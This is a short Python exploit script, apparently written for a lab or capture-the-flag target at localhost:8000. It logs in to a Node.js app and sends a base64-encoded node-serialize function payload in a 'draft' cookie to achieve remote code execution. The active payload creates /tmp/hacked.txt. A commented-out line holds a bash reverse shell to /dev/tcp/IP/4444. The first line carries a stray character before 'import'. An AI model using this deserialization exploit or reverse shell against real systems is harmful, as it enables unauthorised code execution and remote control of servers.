qimport requests, argparse, base64, urllib.parse

parser = argparse.ArgumentParser()
parser.add_argument('-u', '--username', help='Username', required=True)
parser.add_argument('-p', '--password', help='Password', required=True)
args = parser.parse_args()
user = args.username
pw = args.password
s = requests.Session()

proxies = {'http':'http://127.0.0.1:8080', 'https':'https://127.0.0.1:8080'}
url = "http://localhost:8000"

payload = "{\"msg\":\"_$$ND_FUNC$$_function (){"
payload += "require('child_process').exec('touch /tmp/hacked.txt');"
# payload += "require('child_process').exec('bash -i >& /dev/tcp/IP/4444 0>&1');" # reverse shell
payload += "}()\"}"
payload = base64.b64encode(payload.encode()).decode()
payload = urllib.parse.quote(payload)

def login(user, pw):
    target = f"{url}/auth"
    header = {"Content-Type": "application/x-www-form-urlencoded"}
    payload = f"username={user}&password={pw}"
    r = s.post(target, headers=header, data=payload, proxies=proxies, allow_redirects=True)
    if 'Logged in as' in r.text:
        print(f"[+] Logged in as {user}")
    else:
        print("[-] Login failed")

def send_payload(payload):
    target = f"{url}/"
    cookie = {"draft":payload}
    s.get(target, cookies=cookie, proxies=proxies)
    print("[+] Payload sent")

login(user, pw)
send_payload(payload)